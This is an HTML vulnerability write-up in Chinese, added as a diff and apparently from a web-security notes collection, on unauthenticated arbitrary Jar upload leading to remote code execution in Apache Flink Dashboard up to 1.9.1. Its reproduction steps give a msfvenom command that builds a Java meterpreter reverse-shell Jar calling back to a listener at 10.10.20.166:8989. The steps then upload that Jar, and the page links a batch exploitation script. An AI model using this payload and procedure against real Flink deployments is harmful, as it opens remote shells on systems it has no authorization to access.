@@ -1,0 +1,38 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+		</title>
+		<style type="text/css">
+			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
+			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
+			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
+			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
+			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
+			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
+			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
+			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
+			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
+			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
+		</style>
+	</head>
+	<body>
+		<h1 class="csAD577193">
+			<a name="apache-flink-dashboard-未授权访问-远程代码命令执行"><span class="csDE05BCC">Apache Flink Dashboard </span><span class="csECDA2D3">未授权访问</span><span class="csDE05BCC">-</span><span class="csECDA2D3">远程代码命令执行</span></a></h1>
+		<h2 class="cs868C439D">
+			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs8926E06">Apache Flink</span><span class="cs9C1B1871">的任意</span><span class="cs8926E06">Jar</span><span class="cs9C1B1871">包上传导致远程代码执行的漏洞</span></p><h2 class="cs868C439D">
+			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs8926E06">&lt;= 1.9.1(</span><span class="cs9C1B1871">最新版本</span><span class="cs8926E06">)</span></p><h2 class="cs868C439D">
+			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
+		<h3 class="cs868C439D">
+			<a name="X56a192b7913b04c54574d18c28d46e6395428ab"><span class="csD1E291E2">1</span><span class="csD6CA00D2">、</span></a></h3>
+		<p class="cs3A447A38"><span class="cs9FB05234">msfvenom -p java/meterpreter/reverse_tcp LHOST=10.10.20.166 LPORT=8989 -f jar &gt; rce.jar</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Apache_Flink/Apache%20Flink%20Dashboard%20%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae-%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c_files/image0.png" width="560" height="365" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
+			<a name="Xa4b9237bacccdf19c0760cab7aec4a8359010b0"><span class="csD1E291E2">2</span><span class="csD6CA00D2">、</span></a></h3>
+		<p class="cs40DD2BC9"><span class="cs9C1B1871">上传</span><span class="cs8926E06">alewong Jar</span><span class="cs9C1B1871">包</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Apache_Flink/Apache%20Flink%20Dashboard%20%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae-%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c_files/image1.png" width="560" height="174" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/Apache_Flink/Apache%20Flink%20Dashboard%20%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae-%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c_files/image2.png" width="560" height="181" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
+			<a name="批量脚本"><span class="csD6CA00D2">批量脚本</span></a></h3>
+		<p class="cs40DD2BC9"><span class="cs8926E06">https://github.com/ianxtianxt/Apache-Flink-Dashboard-rec</span></p><p class="cs3A447A38"><span class="cs9FB05234">Ps:</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">当注释掉</span><span class="cs9FB05234"> if &#39;Unable to load requested file&#39; in str(data):</span><span class="cs8926E06"><br/></span><span class="cs7FFD2630">之后，出现</span><span class="cs9FB05234">Token</span><span class="cs7FFD2630">为空，或者</span><span class="cs9FB05234"> Unauthorized request </span><span class="cs7FFD2630">时候是不存在未授权访问的，而是带授权</span></p></body>
+</html>
